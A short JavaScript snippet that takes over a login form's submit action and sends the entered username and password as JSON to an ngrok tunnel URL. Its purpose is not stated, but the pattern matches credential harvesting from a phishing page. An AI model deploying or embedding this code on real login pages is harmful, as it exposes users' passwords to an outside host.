'document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('form');

    form.addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the default form submission

        const username = document.getElementById('login').value;
        const password = document.getElementById('password').value;

        fetch('https://44b7-184-64-18-124.ngrok-free.app', { // Replace with your ngrok URL
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Success:', data);
            // Handle the response from the server
        })
        .catch((error) => {
            console.error('Error:', error);
            // Handle errors here
        });
    });
});

